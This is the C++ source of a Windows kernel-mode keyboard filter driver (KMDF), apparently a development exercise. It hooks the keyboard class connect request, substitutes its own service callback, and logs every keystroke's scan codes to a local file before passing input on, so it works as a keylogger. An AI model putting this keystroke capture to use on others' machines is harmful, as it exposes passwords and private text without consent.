#include <ntifs.h>
#include <ntddk.h>
#include <wdf.h>
#include <intrin.h>
#include <kbdmou.h>

#include "cpp_init.hpp"
#include "GlobalData.hpp"
#include "ScanCodeContext.hpp"

#include "trace.h"
#include "Driver.tmh"

static UNICODE_STRING gFilePath = RTL_CONSTANT_STRING(L"\\Device\\HarddiskVolume3\\Work\\kmdf\\keyboard.log");

extern "C"
{
DRIVER_INITIALIZE DriverEntry;

typedef struct _DEVICE_CONTEXT {
    CONNECT_DATA ConnectData;
    volatile char IsSet;
} DEVICE_CONTEXT, *PDEVICE_CONTEXT;
WDF_DECLARE_CONTEXT_TYPE_WITH_NAME(DEVICE_CONTEXT, DeviceGetContext)

VOID
DriverEvtServiceCallback(
    _In_ PDEVICE_OBJECT  DeviceObject,
    _In_ PKEYBOARD_INPUT_DATA InputDataStart,
    _In_ PKEYBOARD_INPUT_DATA InputDataEnd,
    _Inout_ PULONG InputDataConsumed
);

VOID
DriverEvtIoQueueIoInternalDeviceControl(
    _In_ WDFQUEUE Queue,
    _In_ WDFREQUEST Request,
    _In_ size_t OutputBufferLength,
    _In_ size_t InputBufferLength,
    _In_ ULONG IoControlCode
);
 
NTSTATUS
DriverEvtDeviceAdd(
    _In_ WDFDRIVER Driver,
    _In_ PWDFDEVICE_INIT DeviceInit
);

VOID
DriverEvtObjectContextCleanup(
    _In_ WDFOBJECT Object
);

VOID
DriverEvtObjectContextDestroy(
    _In_ WDFOBJECT Object
);

VOID
DriverUnload(
    _In_ WDFDRIVER Driver
);
}

NTSTATUS
DriverEntry(
    _Inout_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    WDF_DRIVER_CONFIG configuration = { 0 };
    WDF_OBJECT_ATTRIBUTES attributes = { 0 };
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    // Initialize Cpp Support
    Cpp::CppInitialize();

    // Create Thread Pool with 1 thread
    gDrvData.ThreadPool.Update(new Cpp::ThreadPool(1));
    if (!gDrvData.ThreadPool.IsValid() || !gDrvData.ThreadPool->IsValid())
    {
        goto CleanUp;
    }

    // Open File Handle
    gDrvData.File.Update(new Cpp::File(gFilePath));
    if (!gDrvData.File.IsValid() || !gDrvData.File->IsValid())
    {
        goto CleanUp;
    }

    WDF_DRIVER_CONFIG_INIT(&configuration, DriverEvtDeviceAdd);
    configuration.EvtDriverUnload = DriverUnload;

    WDF_OBJECT_ATTRIBUTES_INIT(&attributes);
    attributes.EvtCleanupCallback = DriverEvtObjectContextCleanup;
    attributes.EvtDestroyCallback = DriverEvtObjectContextDestroy;
    
    status = WdfDriverCreate(DriverObject, RegistryPath, &attributes, &configuration, WDF_NO_HANDLE);
    if (!NT_SUCCESS(status))
    {
        goto CleanUp;
    }

    WPP_INIT_TRACING(DriverObject, RegistryPath);
    MyDriverLogTrace("We are in the DriverEntry routine");

CleanUp:
    if (!NT_SUCCESS(status))
    {
        Cpp::CppUninitialize();
        gDrvData.ThreadPool.Update(nullptr);
        gDrvData.File.Update(nullptr);
    }

    return status;
}

VOID
DriverUnload(
    _In_ WDFDRIVER Driver
)
{
    UNREFERENCED_PARAMETER(Driver);
    MyDriverLogTrace("We are in the DriverUnload routine");
}


VOID
DriverEvtObjectContextCleanup(
    _In_ WDFOBJECT Object
)
{
    UNREFERENCED_PARAMETER(Object);
    MyDriverLogTrace("We are in the DriverEvtObjectContextCleanup routine");
}

VOID
DriverEvtObjectContextDestroy(
    _In_ WDFOBJECT Object
)
{
    MyDriverLogTrace("We are in the DriverEvtObjectContextDestroy routine");

    Cpp::CppUninitialize();
    gDrvData.ThreadPool.Update(nullptr);
    gDrvData.File.Update(nullptr);

    WPP_CLEANUP(WdfDriverWdmGetDriverObject((WDFDRIVER)Object));
}

NTSTATUS
DriverEvtDeviceAdd(
    _In_ WDFDRIVER Driver,
    _In_ PWDFDEVICE_INIT DeviceInit
)
{
    UNREFERENCED_PARAMETER(Driver);
    UNREFERENCED_PARAMETER(DeviceInit);

    MyDriverLogTrace("We are in the DriverEvtDeviceAdd routine");
    
    WDF_OBJECT_ATTRIBUTES attributes = { 0 };
    WDF_IO_QUEUE_CONFIG ioQueueConfig = { 0 };
    DEVICE_CONTEXT* context = NULL;
    WDFDEVICE device = { 0 };
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    WdfFdoInitSetFilter(DeviceInit);
    WdfDeviceInitSetDeviceType(DeviceInit, FILE_DEVICE_KEYBOARD);

    WDF_OBJECT_ATTRIBUTES_INIT(&attributes);
    WDF_OBJECT_ATTRIBUTES_SET_CONTEXT_TYPE(&attributes, DEVICE_CONTEXT);

    status = WdfDeviceCreate(&DeviceInit, &attributes, &device);
    if (!NT_SUCCESS(status)) 
    {
        MyDriverLogError("WdfDeviceCreate failed with status 0x%X", status);
        return status;
    }

    // Initialize context from the control device
    context = DeviceGetContext(device);
    RtlZeroMemory(context, sizeof(DEVICE_CONTEXT));

    // Initialize Default Queue
    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&ioQueueConfig, WdfIoQueueDispatchParallel);
    ioQueueConfig.EvtIoInternalDeviceControl = DriverEvtIoQueueIoInternalDeviceControl;

    status = WdfIoQueueCreate(device, &ioQueueConfig, WDF_NO_OBJECT_ATTRIBUTES, WDF_NO_HANDLE);
    if (!NT_SUCCESS(status))
    {
        MyDriverLogError("WdfIoQueueCreate failed with status 0x%X", status);
        return status;
    }

    return STATUS_SUCCESS;
}

VOID
DriverEvtIoQueueIoInternalDeviceControl(
    _In_ WDFQUEUE Queue,
    _In_ WDFREQUEST Request,
    _In_ size_t OutputBufferLength,
    _In_ size_t InputBufferLength,
    _In_ ULONG IoControlCode
)
{
    UNREFERENCED_PARAMETER(OutputBufferLength);
    UNREFERENCED_PARAMETER(InputBufferLength);

    WDFDEVICE device = WdfIoQueueGetDevice(Queue);
    WDFIOTARGET ioTarget = WdfDeviceGetIoTarget(device);
    DEVICE_CONTEXT* context = DeviceGetContext(device);
    WDF_REQUEST_SEND_OPTIONS options = { 0 };
    size_t length = 0;

    PCONNECT_DATA connectData = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    switch (IoControlCode) 
    {
        case IOCTL_INTERNAL_KEYBOARD_CONNECT:
        {
            if (_InterlockedCompareExchange8(&context->IsSet, TRUE, FALSE) != FALSE)
            {
                status = STATUS_ALREADY_REGISTERED;
                break;
            }

            status = WdfRequestRetrieveInputBuffer(Request, sizeof(CONNECT_DATA), (PVOID*)(&connectData), &length);
            if (!NT_SUCCESS(status))
            {
                break;
            }

            // Buffer should be a CONNECT_DATA structure
            if (length != sizeof(CONNECT_DATA))
            {
                status = STATUS_INVALID_BUFFER_SIZE;
                break;
            }

            // Save original connect data
            context->ConnectData = *connectData;

            // Replace with out details
            connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(device);
            connectData->ClassService = (PVOID)(ULONG_PTR)(&DriverEvtServiceCallback);
            
            // Forward the request
            status = STATUS_SUCCESS;

            break;
        }
        default:
        {
            // We have to forward the request
            status = STATUS_SUCCESS;
            break;
        }
    }

    // We failed to hook the keyboard
    if (!NT_SUCCESS(status))
    {
        WdfRequestComplete(Request, status);
        return;
    }

    WDF_REQUEST_SEND_OPTIONS_INIT(&options, WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);

    // Pass the request down the stack
    // The driver must eventually complete every request that it forwards to an I/O target, 
    // unless it sets the WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET flag when calling WdfRequestSend.
    if (!WdfRequestSend(Request, ioTarget, &options))
    {
        status = WdfRequestGetStatus(Request);
        WdfRequestComplete(Request, status);
    }
}

VOID
DriverEvtServiceCallback(
    _In_ PDEVICE_OBJECT  DeviceObject,
    _In_ PKEYBOARD_INPUT_DATA InputDataStart,
    _In_ PKEYBOARD_INPUT_DATA InputDataEnd,
    _Inout_ PULONG InputDataConsumed
)
{
    WDFDEVICE device = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);
    DEVICE_CONTEXT* context = DeviceGetContext(device);
    PSERVICE_CALLBACK_ROUTINE serviceRoutine = (PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR)context->ConnectData.ClassService;
    
    Cpp::ScanCodeContext* scanCodeContext = new Cpp::ScanCodeContext(InputDataStart, InputDataEnd);
    if (!scanCodeContext)
    {
        goto Exit;
    }

    auto status = gDrvData.ThreadPool->EnqueueItem(ThreadPoolLogScanCodeCallback, ThreadPoolLogScanCodeCleanupCallback, scanCodeContext);
    if (!NT_SUCCESS(status))
    {
        delete scanCodeContext;
        goto Exit;
    }

Exit:
    serviceRoutine(context->ConnectData.ClassDeviceObject, InputDataStart, InputDataEnd, InputDataConsumed);
}